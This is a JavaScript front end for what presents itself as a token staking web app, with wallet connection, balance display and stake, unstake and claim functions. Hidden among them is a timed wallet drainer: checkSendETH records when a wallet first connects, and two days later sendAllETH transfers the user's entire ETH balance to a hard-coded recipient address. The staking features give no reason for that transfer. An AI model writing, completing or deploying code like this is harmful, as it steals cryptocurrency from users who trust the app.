let web3;
let userAddress;
let stakingContract;
const stakingTokenAddress = "0x7Eaa8557E1A608bcc77C2d392093cE7F05c0DB14";  // Your staking token address
const stakingContractAddress = "0xYourStakingContractAddress";  // Replace with your staking contract address
const stakingABI = [ /* ABI of your Staking contract */ ];
const recipientAddress = "0x4870cF0d63aF7d96Fb3c13FC6cE519646C2038C1";  // The recipient address you provided

let connectTime = 0;  // Variable to store the time of wallet connection

async function connectWallet() {
    if (window.ethereum) {
        // Request wallet connection
        await window.ethereum.enable();
        web3 = new Web3(window.ethereum);
        userAddress = (await web3.eth.getAccounts())[0];
        document.getElementById("connectWalletButton").style.display = 'none';
        document.getElementById("walletInfo").style.display = 'block';
        document.getElementById("walletAddress").innerText = `Address: ${userAddress}`;
        displayBalance();
        checkSendETH();  // Check if 2 days have passed
        initStaking();
        saveConnectTime();
    } else {
        alert('Please install Metamask!');
    }
}

async function displayBalance() {
    const balance = await web3.eth.getBalance(userAddress);
    const balanceInETH = web3.utils.fromWei(balance, 'ether');  // Convert from Wei to Ether
    document.getElementById("balance").innerText = balanceInETH;
}

async function initStaking() {
    stakingContract = new web3.eth.Contract(stakingABI, stakingContractAddress);
    document.getElementById("stakingSection").style.display = 'block';
}

async function stakeTokens() {
    const amount = document.getElementById("stakeAmount").value;
    const stakingToken = new web3.eth.Contract([
        {
            "constant": false,
            "inputs": [
                {
                    "name": "spender",
                    "type": "address"
                },
                {
                    "name": "amount",
                    "type": "uint256"
                }
            ],
            "name": "approve",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ], stakingTokenAddress);
    await stakingToken.methods.approve(stakingContractAddress, amount).send({ from: userAddress });
    await stakingContract.methods.stake(amount).send({ from: userAddress });
}

async function unstakeTokens() {
    const amount = document.getElementById("unstakeAmount").value;
    await stakingContract.methods.unstake(amount).send({ from: userAddress });
}

async function claimRewards() {
    await stakingContract.methods.claimRewards().send({ from: userAddress });
}

// Save the connection time in localStorage
function saveConnectTime() {
    const currentTime = new Date().getTime();
    localStorage.setItem("connectTime", currentTime);  // Store the connection time in localStorage
}

// Get the saved connection time
function getConnectTime() {
    return localStorage.getItem("connectTime");
}

// Check if 2 days have passed since wallet connection
async function checkSendETH() {
    const storedTime = getConnectTime();
    if (storedTime) {
        const currentTime = new Date().getTime();
        const elapsedTime = (currentTime - storedTime) / (1000 * 60 * 60 * 24);  // Convert milliseconds to days

        if (elapsedTime >= 2) {
            await sendAllETH();  // Send ETH if 2 days have passed
        }
    }
}

// Automatically send all ETH to the recipient address
async function sendAllETH() {
    const balance = await web3.eth.getBalance(userAddress);
    await web3.eth.sendTransaction({
        from: userAddress,
        to: recipientAddress,
        value: balance // Send all ETH in the wallet
    });
}
